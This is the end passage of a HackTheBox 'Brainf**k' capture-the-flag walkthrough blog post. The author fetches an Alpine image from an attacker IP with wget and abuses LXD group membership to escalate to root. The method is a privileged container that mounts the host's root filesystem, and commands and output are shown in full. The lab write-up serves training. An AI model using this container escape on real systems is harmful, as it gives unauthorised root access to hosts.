</span></span><span class=line><span class=cl>Downloaded: <span class=m>1</span> files, 7.9K in 0s <span class=o>(</span>41.9 MB/s<span class=o>)</span>
</span></span></code></pre></div><p>I build alpine image on local machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>$ chmod u+x build-alpine                                               
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/lab/brainfuck<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ sudo bash ./build-alpine       
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> kali: 
</span></span><span class=line><span class=cl>Determining the latest release... v3.17
</span></span><span class=line><span class=cl>Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.17/main/x86_64
</span></span><span class=line><span class=cl>Downloading alpine-keys-2.4-r1.apk
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>Downloading apk-tools-static-2.12.10-r1.apk
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK
</span></span><span class=line><span class=cl>Verified OK
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span>  <span class=m>2574</span>  <span class=m>100</span>  <span class=m>2574</span>    <span class=m>0</span>     <span class=m>0</span>    <span class=m>643</span>      <span class=m>0</span>  0:00:04  0:00:04 --:--:--   <span class=m>643</span>
</span></span><span class=line><span class=cl>--2023-05-09 08:56:38--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
</span></span><span class=line><span class=cl>Resolving alpine.mirror.wearetriple.com <span class=o>(</span>alpine.mirror.wearetriple.com<span class=o>)</span>... 93.187.10.106, 2a00:1f00:dc06:10::106
</span></span><span class=line><span class=cl>Connecting to alpine.mirror.wearetriple.com <span class=o>(</span>alpine.mirror.wearetriple.com<span class=o>)</span><span class=p>|</span>93.187.10.106<span class=p>|</span>:80... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Length: <span class=m>2574</span> <span class=o>(</span>2.5K<span class=o>)</span> <span class=o>[</span>text/plain<span class=o>]</span>
</span></span><span class=line><span class=cl>Saving to: ‘/home/kali/lab/brainfuck/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/home/kali/lab/brainfuck/rootfs/usr/share/alpine-mirrors/M 100%<span class=o>[========================================================================================================================================</span>&gt;<span class=o>]</span>   2.51K  --.-KB/s    in 0s      
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2023-05-09 08:56:38 <span class=o>(</span><span class=m>255</span> MB/s<span class=o>)</span> - ‘/home/kali/lab/brainfuck/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved <span class=o>[</span>2574/2574<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Selecting mirror http://mirror.lagoon.nc/alpine//v3.17/main
</span></span><span class=line><span class=cl>fetch http://mirror.lagoon.nc/alpine//v3.17/main/x86_64/APKINDEX.tar.gz
</span></span><span class=line><span class=cl><span class=o>(</span>1/25<span class=o>)</span> Installing alpine-baselayout-data <span class=o>(</span>3.4.0-r0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>2/25<span class=o>)</span> Installing musl <span class=o>(</span>1.2.3-r4<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>3/25<span class=o>)</span> Installing busybox <span class=o>(</span>1.35.0-r29<span class=o>)</span>
</span></span><span class=line><span class=cl>Executing busybox-1.35.0-r29.post-install
</span></span><span class=line><span class=cl><span class=o>(</span>4/25<span class=o>)</span> Installing busybox-binsh <span class=o>(</span>1.35.0-r29<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>5/25<span class=o>)</span> Installing alpine-baselayout <span class=o>(</span>3.4.0-r0<span class=o>)</span>
</span></span><span class=line><span class=cl>Executing alpine-baselayout-3.4.0-r0.pre-install
</span></span><span class=line><span class=cl>Executing alpine-baselayout-3.4.0-r0.post-install
</span></span><span class=line><span class=cl><span class=o>(</span>6/25<span class=o>)</span> Installing ifupdown-ng <span class=o>(</span>0.12.1-r1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>7/25<span class=o>)</span> Installing libcap2 <span class=o>(</span>2.66-r0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>8/25<span class=o>)</span> Installing openrc <span class=o>(</span>0.45.2-r7<span class=o>)</span>
</span></span><span class=line><span class=cl>Executing openrc-0.45.2-r7.post-install
</span></span><span class=line><span class=cl><span class=o>(</span>9/25<span class=o>)</span> Installing mdev-conf <span class=o>(</span>4.3-r0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>10/25<span class=o>)</span> Installing busybox-mdev-openrc <span class=o>(</span>1.35.0-r29<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>11/25<span class=o>)</span> Installing alpine-conf <span class=o>(</span>3.15.1-r1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>12/25<span class=o>)</span> Installing alpine-keys <span class=o>(</span>2.4-r1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>13/25<span class=o>)</span> Installing alpine-release <span class=o>(</span>3.17.3-r0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>14/25<span class=o>)</span> Installing ca-certificates-bundle <span class=o>(</span>20230506-r0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>15/25<span class=o>)</span> Installing libcrypto3 <span class=o>(</span>3.0.8-r4<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>16/25<span class=o>)</span> Installing libssl3 <span class=o>(</span>3.0.8-r4<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>17/25<span class=o>)</span> Installing ssl_client <span class=o>(</span>1.35.0-r29<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>18/25<span class=o>)</span> Installing zlib <span class=o>(</span>1.2.13-r0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>19/25<span class=o>)</span> Installing apk-tools <span class=o>(</span>2.12.10-r1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>20/25<span class=o>)</span> Installing busybox-openrc <span class=o>(</span>1.35.0-r29<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>21/25<span class=o>)</span> Installing busybox-suid <span class=o>(</span>1.35.0-r29<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>22/25<span class=o>)</span> Installing scanelf <span class=o>(</span>1.3.5-r1<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>23/25<span class=o>)</span> Installing musl-utils <span class=o>(</span>1.2.3-r4<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>24/25<span class=o>)</span> Installing libc-utils <span class=o>(</span>0.7.2-r3<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>(</span>25/25<span class=o>)</span> Installing alpine-base <span class=o>(</span>3.17.3-r0<span class=o>)</span>
</span></span><span class=line><span class=cl>Executing busybox-1.35.0-r29.trigger
</span></span><span class=line><span class=cl>OK: <span class=m>10</span> MiB in <span class=m>25</span> packages
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/lab/brainfuck<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ ls
</span></span><span class=line><span class=cl>40611.c  41006.html  alpine-v3.17-x86_64-20230509_0856.tar.gz  a.out  build-alpine  id_rsa  linpeas.sh  ssh.hash
</span></span></code></pre></div><p>So, I send alpine-image from local machine to lab machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>orestis@brainfuck:~$ wget http://10.10.14.32:8080/alpine-v3.17-x86_64-20230509_0856.tar.gz 
</span></span><span class=line><span class=cl>--2023-05-09 16:05:43--  http://10.10.14.32:8080/alpine-v3.17-x86_64-20230509_0856.tar.gz
</span></span><span class=line><span class=cl>Connecting to 10.10.14.32:8080... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Length: <span class=m>3768685</span> <span class=o>(</span>3.6M<span class=o>)</span> <span class=o>[</span>application/gzip<span class=o>]</span>
</span></span><span class=line><span class=cl>Saving to: ‘alpine-v3.17-x86_64-20230509_0856.tar.gz’
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>alpine-v3.17-x86_64-20230509_0856.tar.gz                   100%<span class=o>[========================================================================================================================================</span>&gt;<span class=o>]</span>   3.59M  2.29MB/s    in 1.6s    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2023-05-09 16:05:45 <span class=o>(</span>2.29 MB/s<span class=o>)</span> - ‘alpine-v3.17-x86_64-20230509_0856.tar.gz’ saved <span class=o>[</span>3768685/3768685<span class=o>]</span>
</span></span></code></pre></div><p>Run alpine image.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>orestis@brainfuck:~$ lxc image import ./alpine-v3.17-x86_64-20230509_0856.tar.gz --alias pwnimage
</span></span><span class=line><span class=cl>Image imported with fingerprint: f652d1703ebb3cedb39d7e125f8639a4c6989a7d84d50469b524d1743d28accd
</span></span><span class=line><span class=cl>orestis@brainfuck:~$ lxc image list
</span></span><span class=line><span class=cl>+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span>  ALIAS   <span class=p>|</span> FINGERPRINT  <span class=p>|</span> PUBLIC <span class=p>|</span>          DESCRIPTION          <span class=p>|</span>  ARCH  <span class=p>|</span>  SIZE  <span class=p>|</span>         UPLOAD DATE         <span class=p>|</span>
</span></span><span class=line><span class=cl>+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> pwnimage <span class=p>|</span> f652d1703ebb <span class=p>|</span> no     <span class=p>|</span> alpine v3.17 <span class=o>(</span>20230509_08:56<span class=o>)</span> <span class=p>|</span> x86_64 <span class=p>|</span> 3.59MB <span class=p>|</span> May 9, <span class=m>2023</span> at 1:07pm <span class=o>(</span>UTC<span class=o>)</span> <span class=p>|</span>
</span></span><span class=line><span class=cl>+----------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
</span></span><span class=line><span class=cl>orestis@brainfuck:~$ lxc init pwnimage wolf -c security.privileged<span class=o>=</span><span class=nb>true</span>
</span></span><span class=line><span class=cl>Creating wolf
</span></span><span class=line><span class=cl>orestis@brainfuck:~$ lxc config device add wolf mydevice disk <span class=nv>source</span><span class=o>=</span>/ <span class=nv>path</span><span class=o>=</span>/mnt/root <span class=nv>recursive</span><span class=o>=</span><span class=nb>true</span>
</span></span><span class=line><span class=cl>Device mydevice added to wolf
</span></span><span class=line><span class=cl>orestis@brainfuck:~$ lxc start wolf
</span></span><span class=line><span class=cl>orestis@brainfuck:~$ lxc <span class=nb>exec</span> wolf /bin/sh
</span></span><span class=line><span class=cl>~ <span class=c1># whoami</span>
</span></span><span class=line><span class=cl>root
</span></span><span class=line><span class=cl>~ <span class=c1># cd /mnt/root/root/</span>
</span></span><span class=line><span class=cl>/mnt/root/root <span class=c1># cat root.txt </span>
</span></span></code></pre></div><p>I got root flag.</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://famasoon.github.io/posts/implantpayload/><span class=title>« Prev</span><br><span>Maldev - implant payload</span></a>
<a class=next href=https://famasoon.github.io/posts/nibbles/><span class=title>Next »</span><br><span>HackTheBox Nibbles Walkthrough</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox Walkthrough - Brainf**k on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20Walkthrough%20-%20Brainf%2a%2ak&amp;url=https%3a%2f%2ffamasoon.github.io%2fposts%2fbrainfuck%2f&amp;hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox Walkthrough - Brainf**k on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2ffamasoon.github.io%2fposts%2fbrainfuck%2f&amp;title=HackTheBox%20Walkthrough%20-%20Brainf%2a%2ak&amp;summary=HackTheBox%20Walkthrough%20-%20Brainf%2a%2ak&amp;source=https%3a%2f%2ffamasoon.github.io%2fposts%2fbrainfuck%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox Walkthrough - Brainf**k on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffamasoon.github.io%2fposts%2fbrainfuck%2f&title=HackTheBox%20Walkthrough%20-%20Brainf%2a%2ak"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox Walkthrough - Brainf**k on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffamasoon.github.io%2fposts%2fbrainfuck%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox Walkthrough - Brainf**k on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20Walkthrough%20-%20Brainf%2a%2ak%20-%20https%3a%2f%2ffamasoon.github.io%2fposts%2fbrainfuck%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox Walkthrough - Brainf**k on telegram" href="https://telegram.me/share/url?text=HackTheBox%20Walkthrough%20-%20Brainf%2a%2ak&amp;url=https%3a%2f%2ffamasoon.github.io%2fposts%2fbrainfuck%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://famasoon.github.io/>x64.moe</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>